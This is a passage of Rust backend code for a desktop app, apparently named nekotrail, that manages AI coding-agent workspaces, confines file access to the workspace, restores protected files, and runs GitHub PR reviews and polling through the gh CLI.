        out[&k] = json!(raw(&k));
    }
    Ok(out)
}

/// `<agent>_model`, `<agent>_effort` and `<agent>_mode` for every agent.
fn agent_setting_keys() -> Vec<String> {
    agent::ALL.iter().flat_map(|a| ["model", "effort", "mode"].map(|k| format!("{}_{k}", a.id()))).collect()
}

#[tauri::command]
async fn set_app_setting(st: State<'_, AppState>, key: String, value: String) -> Res<()> {
    if !["caffeinate", "auto_branch"].contains(&key.as_str()) && !agent_setting_keys().contains(&key) {
        return Err(format!("Unknown setting: {key}."));
    }
    st.db().set_setting(&key, &value).map_err(e)
}

#[tauri::command]
async fn set_target_branch(st: State<'_, AppState>, id: String, branch: String) -> Res<()> {
    if !safe::branch_name(&branch) {
        return Err(format!("\"{branch}\" isn't a valid branch name."));
    }
    st.db().set_target_branch(&id, &branch).map_err(e)
}

/// Run a command's subprocess work (git, gh, ps) on the blocking pool. Async commands share a few
/// workers (one per core); a handful of slow `gh` calls there would stall every other command.
async fn blocking<T: Send + 'static>(app: AppHandle, f: impl FnOnce(&AppState) -> Res<T> + Send + 'static) -> Res<T> {
    tauri::async_runtime::spawn_blocking(move || f(&app.state::<AppState>())).await.map_err(e)?
}

#[tauri::command]
async fn changes(app: AppHandle, id: String, uncommitted: Option<bool>) -> Res<Vec<git::FileChange>> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        let dir = Path::new(&ws.path);
        if uncommitted.unwrap_or(false) { git::changes_since(dir, "HEAD") } else { git::changes(dir, &ws.target_branch) }.map_err(e)
    })
    .await
}

#[tauri::command]
async fn file_diff(app: AppHandle, id: String, file: String, uncommitted: Option<bool>) -> Res<String> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        let dir = Path::new(&ws.path);
        if uncommitted.unwrap_or(false) { git::file_diff_since(dir, "HEAD", &file) } else { git::file_diff(dir, &ws.target_branch, &file) }.map_err(e)
    })
    .await
}

/// A path inside the workspace, refusing anything that escapes it, symlinks included (a repo can
/// commit a link to `~/.ssh` or `~/.zshrc`).
fn inside(ws: &Workspace, rel: &str) -> Res<PathBuf> {
    safe::confine(Path::new(&ws.path), rel)
}

#[tauri::command]
async fn read_file(st: State<'_, AppState>, id: String, path: String) -> Res<String> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let full = inside(&ws, &path)?;
    if std::fs::metadata(&full).map(|m| m.len()).unwrap_or(0) > 2_000_000 {
        return Err("This file is over 2 MB. Open it in your editor instead.".into());
    }
    std::fs::read_to_string(&full).map_err(|_| "This file isn't text or can't be read. Open it in your editor instead.".to_string())
}

#[tauri::command]
async fn write_file(st: State<'_, AppState>, id: String, path: String, content: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    std::fs::write(inside(&ws, &path)?, content).map_err(e)
}

/// Move a file to the macOS Trash, so it can be fished out again.
#[cfg(target_os = "macos")]
fn to_trash(p: &Path) -> anyhow::Result<()> {
    use trash::macos::{DeleteMethod, TrashContextExtMacos};
    let mut t = trash::TrashContext::default();
    // The system call, not Finder: no Automation prompt and no sound.
    t.set_delete_method(DeleteMethod::NsFileManager);
    t.delete(p).map_err(|err| anyhow::anyhow!("{err}"))
}

/// Linux: move a file to the freedesktop.org Trash (the one GNOME Files, Dolphin and others show).
#[cfg(not(target_os = "macos"))]
fn to_trash(p: &Path) -> anyhow::Result<()> {
    trash::delete(p).map_err(|err| anyhow::anyhow!("{err}"))
}

/// The protected paths for a workspace: the app's list for its repo, plus the `protected` list in
/// the repo's `nekotrail.json`, read from the workspace and from the main checkout. The main
/// checkout's comes last, so an exception an agent adds to the workspace's copy can't carve out
/// of it. Neither file can remove what the app sets (see `guard`).
fn guard_rules(repo: &Repo, ws: &Workspace) -> guard::Rules {
    let mut file = config::protected_from_file(Path::new(&ws.path));
    if Path::new(&repo.root_path) != Path::new(&ws.path) {
        file.extend(config::protected_from_file(Path::new(&repo.root_path)));
    }
    guard::Rules::new(&repo.prefs.protected, &file)
}

/// Protected paths for Repo settings: what the app has, and what the repo's `nekotrail.json` adds.
#[tauri::command]
async fn repo_guard(st: State<'_, AppState>, id: String) -> Res<Value> {
    let r = st.db().repo(&id).map_err(e)?;
    Ok(json!({"app": r.prefs.protected, "file": config::protected_from_file(Path::new(&r.root_path))}))
}

/// "Put it back": restore the protected files a turn changed, from that turn's checkpoint (and its
/// saved ignored files), and nothing else. The agent's copies go to the Trash first.
#[tauri::command]
async fn put_back_protected(app: AppHandle, id: String, checkpoint: String, ignored: Option<String>, paths: Vec<String>) -> Res<Vec<String>> {
    blocking(app.clone(), move |st| {
        let ws = idle_workspace(st, &id, &checkpoint, true)?;
        let release = || { st.runs.lock().unwrap().rewinding.remove(&ws.id); };
        let root = Path::new(&ws.path);
        if let Some(i) = ignored.as_deref().filter(|i| !i.is_empty())
            && (!safe::object_id(i) || !guard::is_snapshot(root, i)) {
                release();
                return Err("The saved copies from before this turn are gone, so nekotrail can't put these back. Use Rewind instead.".into());
            }
        let repo = match st.db().repo(&ws.repo_id) {
            Ok(r) => r,
            Err(err) => { release(); return Err(e(err)); }
        };
        let rules = guard_rules(&repo, &ws);
        let base = guard::Base { checkpoint: Some(checkpoint.clone()), ignored };
        mark_changed(st, &ws.id);
        let done = guard::put_back(root, &rules, &base, &paths, to_trash);
        release();
        let done = done.map_err(e)?;
        if done.is_empty() {
            return Err("nekotrail couldn't tell what these files looked like before the turn, so it left them alone.".into());
        }
        let ev = json!({"kind": "guard_restored", "files": done, "checkpoint": checkpoint});
        st.db().append_event(&id, &ev).map_err(e)?;
        emit_event(&app, &id, &ev);
        let _ = app.emit("workspaces-changed", json!({}));
        let note = format!(
            "[Note from nekotrail: the user put back protected files you changed: {}. They are protected for this repo. Don't change them again; ask the user if you need to.]",
            done.join(", ")
        );
        let mut runs = st.runs.lock().unwrap();
        let merged = match runs.notes.remove(&id) {
            Some(old) => format!("{old}\n{note}"),
            None => note,
        };
        runs.notes.insert(id, merged);
        Ok(done)
    })
    .await
}

/// Discard the uncommitted changes to one file. The current copy goes to the system Trash first,
/// so nothing is ever deleted outright. Returns "trashed" (a new file) or "restored".
#[tauri::command]
async fn discard_file(app: AppHandle, id: String, path: String) -> Res<String> {
    blocking(app, move |st| {
        let ws = st.db().workspace(&id).map_err(e)?;
        let root = Path::new(&ws.path);
        // A file that still exists must resolve inside the workspace (no symlink out of it). A
        // deleted one only needs a plain relative path: git itself refuses paths through links.
        if root.join(&path).symlink_metadata().is_ok() {
            inside(&ws, &path)?;
        } else if path.is_empty() || Path::new(&path).components().any(|c| !matches!(c, std::path::Component::Normal(_))) {
            return Err("That file is outside the workspace.".into());
        }
        let r = git::discard_file(root, &path, to_trash).map_err(e)?;
        mark_changed(st, &id);
        Ok(if r == git::Discarded::Trashed { "trashed" } else { "restored" }.to_string())
    })
    .await
}

/// Review comments left on the workspace's PR on GitHub (line comments, not general ones).
#[tauri::command]
async fn pr_review_comments(st: State<'_, AppState>, id: String) -> Res<Value> {
    review_comments_blocking(&st, &id)
}

fn review_comments_blocking(st: &AppState, id: &str) -> Res<Value> {
    let ws = st.db().workspace(id).map_err(e)?;
    let n = if ws.review_pr > 0 { ws.review_pr.to_string() } else { gh(&ws.path, &["pr", "view", &ws.branch, "--json", "number", "--jq", ".number"])? };
    let out = gh(&ws.path, &[
        "api", "--paginate", &format!("repos/{{owner}}/{{repo}}/pulls/{}/comments", n.trim()),
        "--jq", "[.[] | {id, path, line: (.line // .original_line), side, body, user: .user.login, avatar: .user.avatar_url, url: .html_url, reply_to: .in_reply_to_id, outdated: (.line == null)}]",
    ])?;
    // --paginate prints one JSON array per page.
    let mut all = vec![];
    for page in serde_json::Deserializer::from_str(&out).into_iter::<Value>() {
        if let Value::Array(a) = page.map_err(e)? {
            all.extend(a);
        }
    }
    Ok(Value::Array(all))
}

#[cfg(target_os = "macos")]
#[tauri::command]
async fn open_in(st: State<'_, AppState>, id: String, app: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let mut c = Command::new("open");
    if app == "finder" {
        c.arg(&ws.path);
    } else {
        let name = OPEN_IN.iter().find(|(k, _)| *k == app).map(|(_, n)| *n).ok_or(format!("Unknown app: {app}. Pick another one in Settings."))?;
        c.args(["-a", name, &ws.path]);
    }
    c.spawn().map_err(e)?;
    Ok(())
}

/// Apps a workspace can open in: (id, macOS app name).
#[cfg(target_os = "macos")]
const OPEN_IN: &[(&str, &str)] = &[
    ("cursor", "Cursor"), ("vscode", "Visual Studio Code"), ("zed", "Zed"), ("windsurf", "Windsurf"),
    ("xcode", "Xcode"), ("intellij", "IntelliJ IDEA"), ("webstorm", "WebStorm"), ("sublime", "Sublime Text"),
    ("terminal", "Terminal"), ("iterm", "iTerm"), ("warp", "Warp"), ("ghostty", "Ghostty"),
];

/// Which of those apps are installed, plus Finder.
#[cfg(target_os = "macos")]
#[tauri::command]
fn open_in_targets() -> Vec<Value> {
    let installed = |name: &str| {
        ["/Applications", "/System/Applications/Utilities", "/System/Applications"]
            .iter()
            .map(PathBuf::from)
            .chain(dirs::home_dir().map(|h| h.join("Applications")))
            .any(|d| d.join(format!("{name}.app")).exists())
    };
    let mut v: Vec<Value> = OPEN_IN.iter().filter(|(_, n)| installed(n)).map(|(k, n)| json!({"id": k, "name": n})).collect();
    v.push(json!({"id": "finder", "name": "Finder"}));
    v
}

/// Linux: open the workspace with an editor or terminal from PATH, or "finder" in the file manager.
#[cfg(not(target_os = "macos"))]
#[tauri::command]
async fn open_in(st: State<'_, AppState>, id: String, app: String) -> Res<()> {
    let ws = st.db().workspace(&id).map_err(e)?;
    linux::open_in(Path::new(&ws.path), &app)
}

/// Linux: the editors and terminals found on PATH, plus the file manager (id "finder").
#[cfg(not(target_os = "macos"))]
#[tauri::command]
fn open_in_targets() -> Vec<Value> {
    linux::open_in_targets()
}

// ---------- reviewing other people's PRs ----------

fn review_key(id: &str) -> String {
    format!("review:{id}")
}

/// A review workspace and what was saved when it started: number, url, title, author, base,
/// head_sha (the commit the comments go on) and merge_base (where the PR's diff starts).
fn review_info(st: &AppState, id: &str) -> Res<(Workspace, Value)> {
    let ws = st.db().workspace(id).map_err(e)?;
    if ws.review_pr <= 0 {
        return Err("This isn't a review workspace.".into());
    }
    let info = st.db().setting(&review_key(id)).map_err(e)?.and_then(|s| serde_json::from_str::<Value>(&s).ok());
    let info = info.filter(|i| i["head_sha"].is_string() && i["merge_base"].is_string());
    Ok((ws, info.ok_or("This review lost its details. Archive it and start the review again.")?))
}

/// The PR's diff, from the repo folder (the commits are there even once the worktree is gone).
fn review_files(repo: &Repo, info: &Value) -> Res<Vec<review::FileDiff>> {
    let (mb, head) = (info["merge_base"].as_str().unwrap_or(""), info["head_sha"].as_str().unwrap_or(""));
    review::pr_diff(Path::new(&repo.root_path), mb, head).map_err(e)
}

/// The agent's findings from one turn in a review workspace become draft comments in Changes.
fn review_findings_in(app: &AppHandle, st: &AppState, workspace_id: &str, text: &str) {
    let found = review::parse_findings(text);
    if found.is_empty() {
        return;
    }
    let comments: Vec<store::ReviewComment> = found
        .iter()
        .map(|f| store::ReviewComment {
            id: review::finding_id(workspace_id, f), file: f.file.clone(), side: f.side.clone(),
            line: f.line, end_line: f.end_line, code: String::new(), text: review::finding_text(f),
        })
        .collect();
    if st.db().add_review_comments(workspace_id, &comments).is_ok() {
        let _ = app.emit("review-findings", json!({"workspace_id": workspace_id, "count": comments.len()}));
    }
}

/// Every PR waiting for your review, across repos, each with its repo id. From the poller's cache.
fn review_requests_list(st: &AppState) -> Value {
    let repos = st.db().repos().unwrap_or_default();
    let c = st.prs.lock().unwrap();
    let mut out: Vec<Value> = vec![];
    for r in &repos {
        for pr in c.requests.get(&r.id).into_iter().flatten() {
            let mut v = pr.clone();
            v["repo_id"] = json!(r.id);
            out.push(v);
        }
    }
    Value::Array(out)
}

fn review_requests_emit(app: &AppHandle, st: &AppState) {
    let list = review_requests_list(st);
    let changed = {
        let mut c = st.prs.lock().unwrap();
        let changed = c.sent_requests.as_ref() != Some(&list);
        if changed { c.sent_requests = Some(list.clone()); }
        changed
    };
    if changed {
        let _ = app.emit("review-requests", list);
    }
}

#[tauri::command]
async fn review_requests(app: AppHandle) -> Res<Value> {
    blocking(app, |st| Ok(review_requests_list(st))).await
}

/// Check the PR's head out in a new read-only workspace (or find the one already open for it).
/// Returns the workspace, the prompt for the agent, and whether it already existed.
fn prepare_review(st: &AppState, repo_id: &str, number: u64) -> Res<(Workspace, String, bool)> {
    if number == 0 {
        return Err("That isn't a PR number.".into());
    }
    let repo = st.db().repo(repo_id).map_err(e)?;
    if let Some(w) = st.db().workspaces(false).map_err(e)?.into_iter().find(|w| w.repo_id == repo.id && w.review_pr == number as i64) {
        return Ok((w, String::new(), true));
    }
    let n = number.to_string();
    let pr: Value = serde_json::from_str(&gh(&repo.root_path, &["pr", "view", &n, "--json", "number,title,url,body,author,headRefOid,baseRefName,state"])?).map_err(e)?;
    if pr["state"] != "OPEN" {
        return Err(format!("PR #{n} isn't open any more."));
    }
    // The author picks the base branch name too; it becomes a git argument.
    let base = pr["baseRefName"].as_str().filter(|b| safe::branch_name(b)).ok_or(format!("PR #{n} goes into a branch git can't use safely."))?.to_string();
    let root = PathBuf::from(&repo.root_path);
    // GitHub keeps every PR's head at pull/N/head, forks included. `+` moves an old review branch
    // to the newest head; it is never checked out (an open review of this PR was returned above).
    let branch = format!("review/pr-{n}");
    git::git(&root, &["fetch", "--quiet", "origin", &format!("+pull/{n}/head:refs/heads/{branch}")]).map_err(e)?;
    let _ = git::git(&root, &["fetch", "--quiet", "origin", &base]);
    let taken: Vec<String> = st.db().workspaces(true).map_err(e)?.into_iter().map(|w| w.name).collect();
    let dir = st.home.join("workspaces").join(&repo.name);
    let mut name = names::pick(&taken);
    while taken.contains(&name) || dir.join(&name).exists() {
        name = names::pick(&taken.iter().cloned().chain([name.clone()]).collect::<Vec<_>>());
    }
    let path = dir.join(&name);
    std::fs::create_dir_all(&dir).map_err(e)?;
    git::restore_worktree(&root, &path, &branch).map_err(e)?;
    let head = git::git(&path, &["rev-parse", "HEAD"]).map_err(e)?;
    let merge_base = git::merge_base(&path, &base).map_err(e)?;
    let title = pr["title"].as_str().unwrap_or("").trim().to_string();
    let ws = Workspace {
        id: new_id(), repo_id: repo.id.clone(), name, branch, path: path.to_string_lossy().to_string(), target_branch: base.clone(),
        state: "active".into(), pinned: false, unread: false, notes: String::new(), imported_from: None, created_at: store::now(),
        title: title.clone(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: String::new(),
        title_source: if title.is_empty() { String::new() } else { title::PR.to_string() }, review_pr: number as i64,
    };
    // No copied secrets (.env) and no setup script: this is someone else's code, only to be read.
    ensure_local_excludes(&root, &[]);
    st.db().insert_workspace(&ws).map_err(e)?;
    let author = pr["author"]["login"].as_str().unwrap_or("ghost").to_string();
    let info = json!({"number": number, "url": pr["url"], "title": title, "author": author, "base": base, "head_sha": head, "merge_base": merge_base});
    st.db().set_setting(&review_key(&ws.id), &info.to_string()).map_err(e)?;
    let prompt = review::agent_prompt(
        &review::PrInfo { number, title: &title, author: &author, base: &base, body: pr["body"].as_str().unwrap_or(""), merge_base: &merge_base },
        &repo.prefs.review_prompt,
    );
    Ok((ws, prompt, false))
}

/// Review someone else's PR: a read-only workspace on its head, and `agent` asked for findings in
/// a read-only chat. Its findings land as draft comments in Changes when the turn ends.
#[tauri::command]
async fn start_review(app: AppHandle, st: State<'_, AppState>, repo_id: String, number: u64, agent: String) -> Res<Workspace> {
    let (ws, prompt, existing) = blocking(app.clone(), move |st| prepare_review(st, &repo_id, number)).await?;
    if existing {
        return Ok(ws);
    }
    let s = Session {
        id: new_id(), workspace_id: ws.id.clone(), agent: agent::get(&agent).id().into(),
        agent_session_id: None, title: format!("Review of #{number}"), model: None, permission_mode: "plan".into(), effort: None,
    };
    st.db().insert_session(&s).map_err(e)?;
    let _ = app.emit("workspaces-changed", json!({}));
    send(app, st, s.id, prompt).await?;
    Ok(ws)
}

/// How the drafts would be posted, before the user submits: how many go on lines, which ones
/// only fit in the summary (their lines aren't in the PR's diff), and how many keep a suggestion.
#[tauri::command]
async fn review_plan(app: AppHandle, id: String) -> Res<Value> {
    blocking(app, move |st| {
        let (ws, info) = review_info(st, &id)?;
        let repo = st.db().repo(&ws.repo_id).map_err(e)?;
        let p = review::plan(&review_files(&repo, &info)?, &st.db().review_comments(&id).map_err(e)?);
        Ok(json!({
            "number": ws.review_pr, "url": info["url"], "title": info["title"], "author": info["author"], "head_sha": info["head_sha"],
            "inline": p.inline.len(), "folded": p.folded,
            "suggestions": p.inline.iter().filter(|i| review::has_suggestion(&i.body)).count(),
        }))
    })
    .await
}

/// Post the drafts to GitHub as one review, then archive the review workspace. Only ever called
/// from the Submit review button: nothing here runs on its own.
#[tauri::command]
async fn submit_review(app: AppHandle, id: String, verdict: String, body: String) -> Res<Value> {
    let app2 = app.clone();
    let out = blocking(app, move |st| {
        let (ws, info) = review_info(st, &id)?;
        let verdict = review::Verdict::parse(&verdict).ok_or("Pick Comment, Approve or Request changes.")?;
        let repo = st.db().repo(&ws.repo_id).map_err(e)?;
        let comments = st.db().review_comments(&id).map_err(e)?;
        let p = review::plan(&review_files(&repo, &info)?, &comments);
        let folded: Vec<&store::ReviewComment> = comments.iter().filter(|c| p.folded.contains(&c.id)).collect();
        let summary = review::summary(&body, &folded);
        review::check(verdict, &summary, p.inline.len())?;
        let host = repo.remote_url.as_deref().and_then(prpoll::enterprise_host);
        let head = info["head_sha"].as_str().unwrap_or("");
        let posted = review::post_review("gh", &repo.root_path, host.as_deref(), ws.review_pr as u64, &review::pending_payload(head, &p.inline), &review::submit_payload(verdict, &summary))?;
        // On GitHub now: the drafts are done.
        let ids: Vec<String> = comments.iter().map(|c| c.id.clone()).collect();
        let _ = st.db().remove_review_comments(&id, &ids);
        pr_poke(st, Some(&ws.repo_id), true);
        let archived = archive_blocking(st, &id, false).is_ok();
        Ok(json!({"url": posted["html_url"], "inline": p.inline.len(), "folded": p.folded.len(), "archived": archived}))
    })
    .await?;
    let _ = app2.emit("workspaces-changed", json!({}));
    Ok(out)
}

#[tauri::command]
async fn update_review_comment(st: State<'_, AppState>, id: String, comment: String, text: String) -> Res<()> {
    st.db().update_review_comment(&id, &comment, &text).map_err(e)
}

// ---------- the PR poller ----------

/// One repo the poller asks GitHub about.
struct PrTarget {
    repo_id: String,
    dir: String,
    remote: Option<String>,
    /// Active workspace branches, plus the parents of stacked ones (even archived), de-duplicated.
    /// Empty for a GitHub repo with no workspaces: it is still asked for review requests.
    branches: Vec<String>,
    /// Autopilot is on for one of its workspaces: poll fast, and keep polling while hidden.
    autopilot: bool,
}

/// Workspaces whose PR the UI wants: active ones, and the parents active ones are stacked on.
fn pr_workspaces(st: &AppState) -> Vec<Workspace> {
    let db = st.db();
    let mut wss = db.workspaces(false).unwrap_or_default();
    let parents: Vec<String> = wss.iter().filter(|w| !w.parent_id.is_empty()).map(|w| w.parent_id.clone()).collect();
    for p in parents {
        if !wss.iter().any(|w| w.id == p) && let Ok(w) = db.workspace(&p) {
            wss.push(w);
        }
    }
    wss
}

fn pr_targets(st: &AppState, wss: &[Workspace]) -> Vec<PrTarget> {
    let repos = st.db().repos().unwrap_or_default();
    let autopilot: Vec<String> = st.db().settings_with_prefix("autopilot:").unwrap_or_default()
        .into_iter().map(|(k, _)| k.trim_start_matches("autopilot:").to_string()).collect();
    repos
        .into_iter()
        .filter_map(|r| {
            let mine: Vec<&Workspace> = wss.iter().filter(|w| w.repo_id == r.id).collect();
            // A repo with no workspaces is still asked whether someone wants your review, if it is on GitHub.
            if mine.is_empty() && r.remote_url.as_deref().is_none_or(prpoll::clearly_not_github) {
                return None;
            }
            let mut branches: Vec<String> = vec![];
            // A review workspace's branch is local (review/pr-N): its PR comes from the review requests.
            for w in mine.iter().filter(|w| w.review_pr == 0) {
                if !branches.contains(&w.branch) { branches.push(w.branch.clone()); }
            }
            Some(PrTarget {
                autopilot: mine.iter().any(|w| autopilot.contains(&w.id)),
                repo_id: r.id, dir: r.root_path, remote: r.remote_url, branches,
            })
        })
        .collect()
}

/// What one poll of a repo brought back.
#[derive(Debug, PartialEq)]
struct Polled {
    prs: prpoll::Parsed,
    /// None when the review request query failed but the branches answered: keep the last list.
    requests: Option<review::Requests>,
}

/// One gh call per repo (per 40 branches), plus one for review requests. Repos without a GitHub
/// remote never spawn gh. A failing branch query fails the poll before the second call is made.
fn poll_target(t: &PrTarget) -> Result<Polled, prpoll::Problem> {
    let Some(remote) = t.remote.as_deref().filter(|r| !prpoll::clearly_not_github(r)) else {
        return Err(prpoll::Problem::NotGithub);
    };
    if !Path::new(&t.dir).is_dir() {
        return Err(prpoll::Problem::Other("The repo folder is missing".into()));
    }
    let host = prpoll::enterprise_host(remote);
    let prs = if t.branches.is_empty() { prpoll::Parsed::default() } else { prpoll::fetch_repo("gh", &t.dir, &t.branches, host.as_deref())? };
    match review::fetch_requests("gh", &t.dir, host.as_deref()) {
        Ok(r) => Ok(Polled { prs, requests: Some(r) }),
        // Only review requests were asked for: their problem is the repo's problem (back-off and all).
        Err(p) if t.branches.is_empty() => Err(p),
        Err(_) => Ok(Polled { prs, requests: None }),
    }
}

/// What the UI gets for one workspace: `pr` (object or null) once known, and a `problem` when
/// GitHub couldn't be asked. None while nothing is known yet.
fn pr_view(c: &PrCache, w: &Workspace) -> Option<Value> {
    let pr = c.by_branch.get(&(w.repo_id.clone(), w.branch.clone()));
    let problem = c.sched.repos.get(&w.repo_id).and_then(|r| r.problem.as_ref());
    if pr.is_none() && problem.is_none() {
        return None;
    }
    let mut v = json!({"workspace_id": w.id});
    if let Some(pr) = pr { v["pr"] = pr.clone(); }
    if let Some(p) = problem { v["problem"] = json!({"code": p.code(), "message": p.message()}); }
    Some(v)
}

/// The PR for a workspace from the poller's cache, or None before the first poll of its repo.
fn cached_pr(st: &AppState, w: &Workspace) -> Option<Value> {
    st.prs.lock().unwrap().by_branch.get(&(w.repo_id.clone(), w.branch.clone())).cloned()
}

/// Ask the poller for a fresh look at one repo (or all) soon. `force` comes from an action that
/// just changed the PR (push, create, merge); otherwise a look under 15 s old is good enough.
fn pr_poke(st: &AppState, repo_id: Option<&str>, force: bool) {
    let now = std::time::Instant::now();
    let min_age = std::time::Duration::from_secs(if force { 2 } else { 15 });
    {
        let mut c = st.prs.lock().unwrap();
        let ids: Vec<String> = match repo_id {
            Some(id) => vec![id.to_string()],
            None => c.sched.repos.keys().cloned().collect(),
        };
        for id in ids {
            c.sched.poke(&id, now, min_age, force);
        }
    }
    // Wake the loop even if no poke went through: it also picks up new or renamed branches, and
    // a pass with nothing due costs a few database reads and no gh.
    if let Some(tx) = st.pr_wake.lock().unwrap().as_ref() {
        let _ = tx.send(());
    }
}

fn pr_poke_workspace(st: &AppState, id: &str, force: bool) {
    // Own statement, so the database lock is let go before the poller's.
    let repo = st.db().workspace(id).map(|w| w.repo_id);
    if let Ok(repo) = repo {
        pr_poke(st, Some(&repo), force);
    }
}

/// The background poller: per repo, one `gh api graphql` for every workspace branch. 20 s while
/// checks run or autopilot is on, 5 min otherwise, paused while the window is hidden (autopilot
/// repos excepted, since autopilot is for when you're away). Emits `pr` per changed workspace,
/// records merges, names untitled workspaces after their PR, and drives autopilot.
fn pr_poll_loop(app: AppHandle) {
    let (tx, rx) = std::sync::mpsc::channel::<()>();
    *app.state::<AppState>().pr_wake.lock().unwrap() = Some(tx);
    std::thread::spawn(move || loop {
        let st = app.state::<AppState>();
        let wss = pr_workspaces(&st);
        let targets = pr_targets(&st, &wss);
        let keys: Vec<(String, bool)> = targets.iter().map(|t| (t.repo_id.clone(), t.autopilot)).collect();
        let now = std::time::Instant::now();
        let due = {
            let mut c = st.prs.lock().unwrap();
            // A branch never asked about (new workspace, renamed branch) makes its repo due.
            // Not while the repo is failing: its back-off decides when to try again.
            for t in &targets {
                if c.sched.repos.get(&t.repo_id).is_none_or(|r| r.problem.is_none()) && t.branches.iter().any(|b| !c.asked.contains(&(t.repo_id.clone(), b.clone()))) {
                    c.sched.poke(&t.repo_id, now, std::time::Duration::from_secs(2), false);
                }
            }
            c.sched.due(now, &keys)
        };
        let todo: Vec<&PrTarget> = targets.iter().filter(|t| due.contains(&t.repo_id)).collect();
        // Repos in parallel, so one slow repo doesn't hold up the others.
        let results: Vec<(&PrTarget, Result<Polled, prpoll::Problem>)> = std::thread::scope(|s| {
            let hs: Vec<_> = todo.iter().map(|t| s.spawn(move || (*t, poll_target(t)))).collect();
            hs.into_iter().filter_map(|h| h.join().ok()).collect()
        });
        let mut polled: Vec<String> = vec![];
        {
            let mut c = st.prs.lock().unwrap();
            let done = std::time::Instant::now();
            for (t, res) in results {
                match res {
                    Ok(Polled { prs: mut p, requests }) => {
                        if let Some(r) = requests {
                            c.requests.insert(t.repo_id.clone(), r.prs);
                            p.remaining = match (p.remaining, r.remaining) { (Some(a), Some(b)) => Some(a.min(b)), (a, b) => a.or(b) };
                            p.reset_in = p.reset_in.or(r.reset_in);
                        }
                        for b in &t.branches {
                            c.asked.insert((t.repo_id.clone(), b.clone()));
                        }
                        for (b, pr) in p.prs {
                            c.by_branch.insert((t.repo_id.clone(), b), pr);
                        }
                        let hot = t.autopilot || t.branches.iter().any(|b| c.by_branch.get(&(t.repo_id.clone(), b.clone())).is_some_and(prpoll::is_hot));
                        let low = p.remaining.filter(|r| *r < prpoll::LOW_RATE).map(|_| p.reset_in.unwrap_or(prpoll::IDLE));
                        c.sched.record(&t.repo_id, done, hot, Ok(low));
                        polled.push(t.repo_id.clone());
                    }
                    Err(problem) => c.sched.record(&t.repo_id, done, t.autopilot, Err(problem)),
                }
            }
        }
        if !todo.is_empty() {
            pr_emit_changes(&app, &st, &wss);
            review_requests_emit(&app, &st);
        }
        // Autopilot reacts to what was just fetched.
        for w in wss.iter().filter(|w| w.state == "active" && polled.contains(&w.repo_id)) {
            if st.db().setting(&autopilot_key(&w.id)).ok().flatten().is_some() {
                let (app2, id) = (app.clone(), w.id.clone());
                std::thread::spawn(move || autopilot_tick(&app2, &id));
            }
        }
        let wait = st.prs.lock().unwrap().sched.wait(std::time::Instant::now(), &keys);
        let _ = rx.recv_timeout(wait.max(std::time::Duration::from_millis(500)));
        while rx.try_recv().is_ok() {}
    });
}

/// Send a `pr` event for every workspace whose PR (or problem) changed since last time.
fn pr_emit_changes(app: &AppHandle, st: &AppState, wss: &[Workspace]) {
    let changed: Vec<(Workspace, Value)> = {
        let mut c = st.prs.lock().unwrap();
        let mut out = vec![];
        for w in wss {
            let Some(v) = pr_view(&c, w) else { continue };
            if c.sent.get(&w.id) != Some(&v) {
                c.sent.insert(w.id.clone(), v.clone());
                out.push((w.clone(), v));
            }
        }
        out
    };
    for (w, v) in changed {
        let pr = &v["pr"];
        if pr["state"] == "MERGED" {
            let _ = st.db().set_merged(&w.id);
        }
        // The PR names the task now, unless the user named it by hand.
        if let Some(t) = pr["title"].as_str().map(str::trim).filter(|t| !t.is_empty()) {
            let renamed = st.db().set_title(&w.id, t, title::PR).unwrap_or(false);
            if renamed {
                let _ = app.emit("workspaces-changed", json!({}));
            }
        }
        let _ = app.emit("pr", v);
    }
}

/// Everything the poller knows right now, per workspace (same payload as the `pr` event).
/// Never calls GitHub; the UI asks once at start and then listens.
#[tauri::command]
async fn pr_cache(app: AppHandle) -> Res<HashMap<String, Value>> {
    blocking(app, |st| {
        let wss = pr_workspaces(st);
        let c = st.prs.lock().unwrap();
        Ok(wss.iter().filter_map(|w| pr_view(&c, w).map(|v| (w.id.clone(), v))).collect())
    })
    .await
}

/// Look again soon at the repo of this workspace (or every repo). The answer arrives as `pr` events.
#[tauri::command]
async fn pr_refresh(app: AppHandle, id: Option<String>, force: Option<bool>) -> Res<()> {
    blocking(app, move |st| {
        match id {
            Some(id) => pr_poke_workspace(st, &id, force.unwrap_or(false)),
            None => pr_poke(st, None, force.unwrap_or(false)),
        }
        Ok(())
    })
    .await
}

/// The window was hidden or came back. Coming back refreshes anything older than 20 s.
#[tauri::command]
async fn pr_visible(app: AppHandle, visible: bool) -> Res<()> {
    blocking(app, move |st| {
        {
            let mut c = st.prs.lock().unwrap();
            c.sched.visible = visible;
            if !visible { return Ok(()); }
            let now = std::time::Instant::now();
            let ids: Vec<String> = c.sched.repos.keys().cloned().collect();
            for id in ids {
                c.sched.poke(&id, now, std::time::Duration::from_secs(20), false);
            }
        }
        // Always wake: the loop may be sleeping on a timetable worked out while hidden.
        if let Some(tx) = st.pr_wake.lock().unwrap().as_ref() {
            let _ = tx.send(());
        }
        Ok(())
    })
    .await
}

/// Lines added and removed per active workspace versus its target branch (for the sidebar).
/// Runs the git calls in parallel; a workspace that fails is just left out.
#[tauri::command]
async fn line_counts(app: AppHandle) -> Res<HashMap<String, (u32, u32)>> {
    // Off the async workers: this runs git in every workspace that needs a recount.
    tauri::async_runtime::spawn_blocking(move || {
        let st = app.state::<AppState>();
        let wss = st.db().workspaces(false).map_err(e)?;
        const FRESH: std::time::Duration = std::time::Duration::from_secs(300);
        let (mut out, todo): (HashMap<String, (u32, u32)>, Vec<Workspace>) = {
            let cache = st.lines.lock().unwrap();
            let mut out = HashMap::new();
            let mut todo = vec![];
            for w in wss {
                match cache.0.get(&w.id) {
                    Some((at, v, _)) if !cache.1.contains(&w.id) && at.elapsed() < FRESH => { out.insert(w.id.clone(), *v); }
                    _ => todo.push(w),
                }
            }
            (out, todo)
        };
        let handles: Vec<_> = todo
            .into_iter()
            .map(|w| std::thread::spawn(move || {
                let c = git::changes(Path::new(&w.path), &w.target_branch).ok()?;
                let counts = (c.iter().map(|f| f.additions).sum::<u32>(), c.iter().map(|f| f.deletions).sum::<u32>());
